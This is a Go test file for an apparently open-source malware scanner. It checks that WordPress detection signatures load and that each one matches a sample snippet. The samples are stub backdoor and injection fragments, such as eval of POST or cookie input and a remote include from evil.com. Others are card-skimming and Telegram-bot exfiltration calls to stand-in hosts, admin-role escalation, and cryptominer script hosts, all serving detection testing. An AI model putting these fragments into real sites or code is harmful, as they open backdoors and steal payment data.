package signatures

import (
	"path/filepath"
	"strings"
	"testing"

	"github.com/IvanShishkin/houndoom/pkg/models"
)

// TestAllSignatureFilesLoad validates that every YAML signature file in
// configs/signatures loads, compiles (regex) and has the required metadata.
// This guards the whole project against a single broken signature breaking
// the scan at load time.
func TestAllSignatureFilesLoad(t *testing.T) {
	loader := NewLoader(filepath.Join("..", "..", "configs", "signatures"))
	db, err := loader.Load()
	if err != nil {
		t.Fatalf("failed to load signatures: %v", err)
	}
	if len(db.Signatures) == 0 {
		t.Fatal("no signatures loaded")
	}

	validSev := map[models.Severity]bool{
		models.SeverityCritical: true, models.SeverityHigh: true,
		models.SeverityMedium: true, models.SeverityLow: true, models.SeverityInfo: true,
	}
	validCat := map[models.ThreatType]bool{}
	for _, c := range []models.ThreatType{
		models.ThreatPHPBackdoor, models.ThreatPHPShell, models.ThreatPHPMalware,
		models.ThreatPHPInjection, models.ThreatPHPObfuscated, models.ThreatPHPSuspicious,
		models.ThreatJSVirus, models.ThreatJSMalware, models.ThreatJSObfuscated,
		models.ThreatJSSuspicious, models.ThreatXSS, models.ThreatIframe,
		models.ThreatPhishing, models.ThreatAdware, models.ThreatSpam,
		models.ThreatDoorway, models.ThreatRedirect, models.ThreatExecutable,
		models.ThreatSuspicious, models.ThreatVulnerability, models.ThreatObfuscated,
		models.ThreatHiddenFile, models.ThreatSymlink, models.ThreatModified,
		models.ThreatUnknown,
	} {
		validCat[c] = true
	}

	seenIDs := make(map[string]bool)
	for _, sig := range db.Signatures {
		t.Run(sig.ID, func(t *testing.T) {
			if sig.ID == "" {
				t.Error("empty ID")
			}
			if seenIDs[sig.ID] {
				t.Errorf("duplicate signature ID: %s", sig.ID)
			}
			seenIDs[sig.ID] = true

			if sig.Name == "" {
				t.Error("empty Name")
			}
			if sig.Pattern == "" {
				t.Error("empty Pattern")
			}
			if !validSev[sig.Severity] {
				t.Errorf("invalid Severity: %q", sig.Severity)
			}
			if sig.Category == "" || !validCat[sig.Category] {
				t.Errorf("invalid Category: %q", sig.Category)
			}
			if len(sig.Extensions) == 0 {
				t.Error("no Extensions")
			}
			// Regex signatures MUST have compiled successfully during AddSignature.
			if sig.IsRegex && sig.CompiledRe == nil {
				t.Errorf("regex signature not compiled: %s (pattern: %s)", sig.ID, sig.Pattern)
			}
		})
	}
}

// TestWordPressSignaturesSampleMatch ensures every WordPress signature matches
// at least one synthetic sample. This catches signatures that can never fire
// (over-escaped patterns, impossible anchors) — a common regression source.
func TestWordPressSignaturesSampleMatch(t *testing.T) {
	loader := NewLoader(filepath.Join("..", "..", "configs", "signatures"))
	db, err := loader.Load()
	if err != nil {
		t.Fatalf("failed to load signatures: %v", err)
	}

	// id -> sample snippet that MUST trigger the signature
	samples := map[string]string{
		"WP-BACKDOOR-001":  "wp-xmlrpc.php",
		"WP-BACKDOOR-002":  "wp-cron-jobs.php",
		"WP-BACKDOOR-003":  "wp-vcd.php",
		"WP-BACKDOOR-004":  `eval(base64_decode("x"));`,
		"WP-BACKDOOR-005":  `include("https://evil.com/s.php");`,
		"WP-BACKDOOR-006":  `wp_create_user('a','b'); set_role('administrator');`,
		"WP-BACKDOOR-007":  "Plugin Name: X\nsystem('ls');",
		"WP-BACKDOOR-008":  `eval($_POST['x']);`,
		"WP-BACKDOOR-009":  "wp-tmp.php",
		"WP-BACKDOOR-010":  "wp-feed.php",
		"WP-BACKDOOR-011":  "Plugin Name: X\neval('y');",
		"WP-BACKDOOR-012":  `eval(gzinflate(base64_decode("x")));`,
		"WP-BACKDOOR-013":  `preg_replace('/.*/e', 'x');`,
		"WP-BACKDOOR-014":  `$_COOKIE['FilesMan']`,
		"WP-BACKDOOR-015":  `$auth_pass='x';`,
		"WP-BACKDOOR-016":  `eval(gzinflate(str_rot13(base64_decode('x'))));`,
		"WP-BACKDOOR-017":  `eval(gzinflate(str_rot13(base64_decode('x'))));`,
		"WP-BACKDOOR-018":  `eval($_COOKIE['x']);`,
		"WP-BACKDOOR-019":  `eval(get_option('p'));`,
		"WP-BACKDOOR-020":  `maybe_unserialize($_POST['d']);`,
		"WP-BACKDOOR-021":  `unserialize($_GET['o']);`,
		"WP-BACKDOOR-022":  `file_exists('phar://x.phar');`,
		"WP-BACKDOOR-023":  "Shell by Snip3r",
		"WP-BACKDOOR-024":  `eval($wpdb->get_var("SELECT x"));`,

		"WP-SQLI-001": `$wpdb->query("x" . $_GET['id']);`,
		"WP-SQLI-002": `$wpdb->query("SELECT * FROM t WHERE id=" . $id);`,
		"WP-SQLI-003": `$wpdb->get_results("SELECT * FROM t WHERE n=" . $n);`,
		"WP-SQLI-004": `$wpdb->get_var("SELECT name FROM t WHERE id=" . $id);`,
		"WP-SQLI-005": `LIKE '%{$_GET['q']}`,
		"WP-SSRF-001": `wp_remote_get($_POST['url']);`,
		"WP-SSRF-002": `wp_remote_post($_GET['url']);`,
		"WP-SSRF-003": `wp_safe_remote_get($_POST['url']);`,
		"WP-SSRF-004": `download_url($_POST['file']);`,
		"WP-SSRF-005": `curl_setopt($c, CURLOPT_URL, $_POST['url']);`,
		"WP-VULN-001": `update_option('o', $_POST['v']);`,
		"WP-VULN-002": `add_option('o', $_GET['v']);`,
		"WP-VULN-003": `call_user_func($_GET['fn']);`,
		"WP-VULN-004": `file_put_contents($f, $_POST['c']);`,
		"WP-OPT-001":  `update_option('default_role', 'administrator');`,
		"WP-OPT-002":  `update_option('users_can_register', 1);`,
		"WP-AUTH-001": `wp_set_auth_cookie($uid);`,
		"WP-AUTH-002": `wp_insert_user(array('role' => 'administrator'));`,
		"WP-AUTH-003": `$user->add_cap('manage_options');`,
		"WP-AUTH-004": `$user->set_role('administrator');`,
		"WP-AUTH-005": `add_action('wp_ajax_nopriv_x', 'cb');`,
		"WP-AUTH-006": `$u->add_role('administrator');`,
		"WP-AUTH-007": `grant_super_admin($uid);`,
		"WP-AUTH-008": `wp_set_current_user($uid);`,
		"WP-AUTH-009": `update_user_meta($uid, 'wp_capabilities', $caps);`,
		"WP-AJAX-002": `add_action('admin_post_nopriv_x', 'cb');`,
		"WP-REST-001": `register_rest_route('m/v1','/x',array('permission_callback' => '__return_true'));`,
		"WP-REST-002": `register_rest_route('m/v1','/x',array('callback'=>function(){ eval('x'); }));`,
		"WP-CRON-001": `wp_schedule_single_event(time(), 'h', array($_POST['p']));`,
		"WP-HOOK-001": `add_action('init', function(){ eval('x'); });`,
		"WP-HOOK-002": `add_action('wp_head', function(){ base64_decode('x'); });`,
		"WP-HOOK-003": `add_filter('the_content', function($c){ return '<script>x</script>'; });`,
		"WP-HOOK-004": `wp_schedule_event(time(), 'hourly', 'h');`,
		"WP-HOOK-005": `register_activation_hook(__FILE__, function(){ eval('x'); });`,
		"WP-HOOK-006": `add_action('wp_footer', function(){ base64_decode('x'); });`,
		"WP-HOOK-007": `add_action('admin_init', function(){ file_put_contents('x','y'); });`,
		"WP-HOOK-008": `add_action('init', 'my_cb');`,

		"WP-MALWARE-001": `define('WP_CD_CODE', true);`,
		"WP-MALWARE-002": `require_once('wp-tmp.php');`,
		"WP-MALWARE-003": `require_once('wp-feed.php');`,
		"WP-MALWARE-004": `coinhive.min.js`,
		"WP-MALWARE-005": `cryptoloot.pro`,
		"WP-MALWARE-006": `authedmine.com.min.js`,
		"WP-MALWARE-007": `var cvv = document.querySelector('#cvv'); fetch('https://e.co', cvv);`,
		"WP-MALWARE-008": `document.querySelector('.payment').addEventListener('submit', function(){ fetch('https://e.co', data); });`,
		"WP-MALWARE-009": `<a href="x">Buy viagra</a>`,
		"WP-MALWARE-011": `header("Location: https://evil.tk/");`,
		"WP-MALWARE-012": `location.href = 'https://evil.ml/';`,
		"WP-MALWARE-013": `update_option('siteurl', 'https://e.co');`,
		"WP-MALWARE-015": `if(strpos($_SERVER['HTTP_USER_AGENT'],'googlebot')!==false){echo $spam;}`,
		"WP-MALWARE-016": `document.head.appendChild(document.createElement('script')).src='https://e.co/x.js';`,
		"WP-MALWARE-018": `var u='https://thecarboncritic.com/x';`,
		"WP-MALWARE-019": `window['_cygnus'] = {};`,
		"WP-MALWARE-020": `fetch('https://bsnindex.net/b');`,
		"WP-MALWARE-021": `WebAssembly.instantiateStreaming(fetch('x.wasm')).then(m=>monero(m));`,
		"WP-MALWARE-023": `new WebSocket('wss://gulf.moneroocean.stream:443/');`,
		"WP-MALWARE-024": `<script src="https://www.coinimp.com/lib/min.js"></script>`,
		"WP-MALWARE-025": `jQuery('form.checkout').on('checkout_place_order', function(){ fetch('https://e.co', d); });`,
		"WP-MALWARE-026": `document.querySelector('iframe[name*="__privateStripeFrame"]');`,
		"WP-MALWARE-027": `document.querySelector('input[name="cardnumber"]');`,
		"WP-MALWARE-028": `fetch('https://api.telegram.org/bot123/sendMessage', {body: JSON.stringify(d)});`,
	}

	byID := db.ByID
	for id, sample := range samples {
		sig, ok := byID[id]
		if !ok {
			t.Errorf("signature %s not present in loaded DB", id)
			continue
		}
		t.Run(id, func(t *testing.T) {
			matched := false
			if sig.IsRegex && sig.CompiledRe != nil {
				matched = sig.CompiledRe.MatchString(sample)
			} else if !sig.IsRegex {
				matched = strings.Contains(strings.ToLower(sample), strings.ToLower(sig.Pattern))
			}
			if !matched {
				t.Errorf("signature %s does not match its sample\n  pattern: %s\n  sample:  %s",
					id, sig.Pattern, sample)
			}
		})
	}
}
